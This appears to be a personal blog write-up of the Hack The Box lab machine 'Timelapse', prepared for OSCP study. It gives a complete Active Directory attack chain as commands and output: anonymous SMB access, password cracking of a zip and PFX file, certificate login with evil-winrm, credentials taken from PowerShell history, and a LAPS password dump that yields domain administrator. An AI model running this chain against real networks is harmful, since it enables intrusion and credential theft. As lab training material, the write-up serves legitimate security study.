---
layout: post
title: "timelapse"
date: 2025-10-08 
categories: OSCP Playlist
---
# timelapse

# Summary

- smb null authentication to get winrm_backup.zip
- zip file is password protected; zip2john to crack zip password
- unzip to find pfx file
- pfx2john to crack password for cert
- extract private and public key from pfx
- evil-wirm login via cert and private key
- powershell history to find password for svc_deploy
- valid credential; use bloodhound to map out AD
- svc_deploy part of LAPS Readers group
- read LAPS password to find administrator password; administrator access

# Attack Path

First enumerate the open ports and services:

```bash
sudo nmap -sC -sV -oN nmap/timelapse 10.10.11.152

PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-10-08 20:27:25Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
5986/tcp open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn: 
|_  http/1.1
|_http-title: Not Found
|_ssl-date: 2025-10-08T20:28:46+00:00; +8h00m03s from scanner time.
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

From the open ports, it seems like a domain controller. We also get the domain name, let’s add that to our /etc/hots file:

```bash
10.10.11.152 timelapse.htb dc01.timelapse.htb
```

First, let’s see if the smb server allows null authentication:

```bash
nxc smb 10.10.11.152 -u 'any' -p '' --shares

SMB         10.10.11.152    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.152    445    DC01             [+] timelapse.htb\any: (Guest)
SMB         10.10.11.152    445    DC01             [*] Enumerated shares
SMB         10.10.11.152    445    DC01             Share           Permissions     Remark
SMB         10.10.11.152    445    DC01             -----           -----------     ------
SMB         10.10.11.152    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.152    445    DC01             C$                              Default share
SMB         10.10.11.152    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.152    445    DC01             NETLOGON                        Logon server share 
SMB         10.10.11.152    445    DC01             Shares          READ            
SMB         10.10.11.152    445    DC01             SYSVOL                          Logon server share
```

Let’s read the share Shares:

```bash
nxc smb 10.10.11.152 -u 'any' -p '' --spider Shares --regex .

SMB         10.10.11.152    445    DC01             //10.10.11.152/Shares/Dev [dir]
SMB         10.10.11.152    445    DC01             //10.10.11.152/Shares/HelpDesk [dir]
SMB         10.10.11.152    445    DC01             //10.10.11.152/Shares/Dev/. [dir]
SMB         10.10.11.152    445    DC01             //10.10.11.152/Shares/Dev/.. [dir]
SMB         10.10.11.152    445    DC01             //10.10.11.152/Shares/Dev/winrm_backup.zip [lastm:'2021-10-25 17:05' size:2611]
SMB         10.10.11.152    445    DC01             //10.10.11.152/Shares/HelpDesk/. [dir]
SMB         10.10.11.152    445    DC01             //10.10.11.152/Shares/HelpDesk/.. [dir]
SMB         10.10.11.152    445    DC01             //10.10.11.152/Shares/HelpDesk/LAPS.x64.msi [lastm:'2021-10-25 11:55' size:1118208]
SMB         10.10.11.152    445    DC01             //10.10.11.152/Shares/HelpDesk/LAPS_Datasheet.docx [lastm:'2021-10-25 11:55' size:104422]
SMB         10.10.11.152    445    DC01             //10.10.11.152/Shares/HelpDesk/LAPS_OperationsGuide.docx [lastm:'2021-10-25 11:55' size:641378]
SMB         10.10.11.152    445    DC01             //10.10.11.152/Shares/HelpDesk/LAPS_TechnicalSpecification.docx [lastm:'2021-10-25 11:55' size:72683]

```

Let’s download all the files back to our host:

```bash
smbclient -N //10.10.11.152/Shares

smb: \> cd Dev
smb: \Dev\> ls
  .                                   D        0  Mon Oct 25 15:40:06 2021
  ..                                  D        0  Mon Oct 25 15:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 11:46:42 2021

                6367231 blocks of size 4096. 1288165 blocks available
smb: \Dev\> get winrm_backup.zip 
getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (27.7 KiloBytes/sec) (average 27.7 KiloBytes/sec)
smb: \Dev\> cd ../HelpDesk\
smb: \HelpDesk\> ls
  .                                   D        0  Mon Oct 25 11:48:42 2021
  ..                                  D        0  Mon Oct 25 11:48:42 2021
  LAPS.x64.msi                        A  1118208  Mon Oct 25 10:57:50 2021
  LAPS_Datasheet.docx                 A   104422  Mon Oct 25 10:57:46 2021
  LAPS_OperationsGuide.docx           A   641378  Mon Oct 25 10:57:40 2021
  LAPS_TechnicalSpecification.docx      A    72683  Mon Oct 25 10:57:44 2021

                6367231 blocks of size 4096. 1288165 blocks available
smb: \HelpDesk\> get LAPS_Datasheet.docx
getting file \HelpDesk\LAPS_Datasheet.docx of size 104422 as LAPS_Datasheet.docx (522.9 KiloBytes/sec) (average 364.2 KiloBytes/sec)
smb: \HelpDesk\> mget LAPS_OperationsGuide.docx LAPS_TechnicalSpecification.docx
Get file LAPS_OperationsGuide.docx? 
Get file LAPS_TechnicalSpecification.docx? 
smb: \HelpDesk\> mget LAPS_OperationsGuide.docx LAPS_TechnicalSpecification.docx
Get file LAPS_OperationsGuide.docx? y
getting file \HelpDesk\LAPS_OperationsGuide.docx of size 641378 as LAPS_OperationsGuide.docx (3212.0 KiloBytes/sec) (average 1516.3 KiloBytes/sec)
Get file LAPS_TechnicalSpecification.docx? y
getting file \HelpDesk\LAPS_TechnicalSpecification.docx of size 72683 as LAPS_TechnicalSpecification.docx (446.4 KiloBytes/sec) (average 1250.9 KiloBytes/sec)

```

Attempting to unzip the zip file prompts us a password:

![image.png]({{ site.baseurl }}/assets/timelapse/image.png)

Let’s convert the zip file to hash format and attempt to crack it:

```bash
zip2john winrm_backup.zip > backup.hash
```

Now let’s attempt to crack the hash:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt backup.hash

supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)
```

Now let’s unzip the archive:

```bash
unzip winrm_backup.zip
```

We get a pfx file:

```bash
legacyy_dev_auth.pfx
```

A **PFX file** (also known as **PKCS#12**, typically with `.pfx` or `.p12` extension) is a **container file format** that stores:

- a **private key**
- its corresponding **public certificate** (X.509 format)
- and optionally, the **entire certificate chain** (intermediate + root CAs).

It’s a **binary format** commonly used for **authentication** and **encryption**, especially in Windows, IIS, and Active Directory environments.

We can try and crack it’s private key again with john:

```bash
pfx2john legacyy_dev_auth.pfx legacyy_dev_auth.hash

john --wordlist=/usr/share/wordlists/rockyou.txt legacyy_dev_auth.hash

thuglegacy       (legacyy_dev_auth.pfx) 
```

Let’s enumerate users and get a list of valid AD users on the machine:

```bash
nxc smb 10.10.11.152 -u any -p '' --rid-brute 6000
```

Format it:

```bash
grep TIMELAPSE rid-brute.txt | awk '{print $6}' | awk -F\\ '{print $2}' | sort -u | grep -v '\$$' | tr '[:upper:]' '[:lower:]' > ad_users.txt
```

From the users lists, we see a user legacyy. 

Now let’s extract the private and public key:

```bash
openssl pkcs12 -in backup/legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
# => extract the private key only, and because of -nodes the key is written **unencrypted** to key.pem

openssl pkcs12 -in backup/legacyy_dev_auth.pfx -nokeys -out cert.pem
# => extract the certificate(s) only (no private key) to cert.pem

```

Now let’s use evil-winrm to login:

```bash
evil-winrm -S -c cert.pem -k key.pem -i 10.10.11.152
```

![image.png]({{ site.baseurl }}/assets/timelapse/image%201.png)

We are in.

Let’s check our privilges:

```bash
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```

We can try and get powershell history from this:

```bash
Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt

whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

It seems we got the password for user svc_deploy. Let’s check that with nxc:

```bash
nxc smb 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' --shares

SMB         10.10.11.152    445    DC01             [+] timelapse.htb\svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV 
SMB         10.10.11.152    445    DC01             [*] Enumerated shares
SMB         10.10.11.152    445    DC01             Share           Permissions     Remark
SMB         10.10.11.152    445    DC01             -----           -----------     ------
SMB         10.10.11.152    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.152    445    DC01             C$                              Default share
SMB         10.10.11.152    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.152    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.152    445    DC01             Shares          READ            
SMB         10.10.11.152    445    DC01             SYSVOL          READ            Logon server share 
```

Since we have a valid credential now, let’s map out the AD with bloodhound:

```bash
mkdir bh_out
bloodhound-python -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -ns 10.10.11.152 -d timelapse.htb -c all

bloodhound-python -u j.fleischman -p 'J0elTHEM4n1990!' -ns 10.10.11.69 -d fluffy.htb -c all

sudo neo4j start
bloodhound
```

Checking our privileges, we see that we can read LAPS password:

![image.png]({{ site.baseurl }}/assets/timelapse/image%202.png)

The `Local Administrator Password Solution (LAPS)` provides management of local account passwords on domain-joined computers. Let’s read LAPS:

```bash
nxc ldap 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -M laps

LDAP        10.10.11.152    389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:timelapse.htb)
LDAP        10.10.11.152    389    DC01             [+] timelapse.htb\svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV 
LAPS        10.10.11.152    389    DC01             [*] Getting LAPS Passwords
LAPS        10.10.11.152    389    DC01             Computer:DC01$ User:                Password:{h&RESC7Z+y4w6&F69i6@-$R
```

This should be administrator’s password. Let’s test that:

```bash
nxc smb 10.10.11.152 -u administrator -p '{h&RESC7Z+y4w6&F69i6@-$R' --shares

SMB         10.10.11.152    445    DC01             [+] timelapse.htb\administrator:{h&RESC7Z+y4w6&F69i6@-$R (Pwn3d!)
SMB         10.10.11.152    445    DC01             [*] Enumerated shares
SMB         10.10.11.152    445    DC01             Share           Permissions     Remark
SMB         10.10.11.152    445    DC01             -----           -----------     ------
SMB         10.10.11.152    445    DC01             ADMIN$          READ,WRITE      Remote Admin
SMB         10.10.11.152    445    DC01             C$              READ,WRITE      Default share
SMB         10.10.11.152    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.152    445    DC01             NETLOGON        READ,WRITE      Logon server share 
SMB         10.10.11.152    445    DC01             Shares          READ,WRITE      
SMB         10.10.11.152    445    DC01             SYSVOL          READ,WRITE      Logon server share 
```

We now have administrator acces. We can winrm to the machine:

```bash
evil-winrm -S -u administrator -p '{h&RESC7Z+y4w6&F69i6@-$R' -i 10.10.11.152
```